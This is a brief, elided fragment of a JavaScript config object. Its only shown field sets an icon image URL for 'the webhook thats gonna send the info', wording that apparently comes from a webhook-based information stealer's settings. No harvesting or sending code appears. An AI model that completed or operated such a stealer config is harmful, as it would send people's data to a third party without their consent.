...
const config = {
  ...
  embed_icon: 'https://raw.githubusercontent.com/ICoolBuddy/aderre/main/oda.png', //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
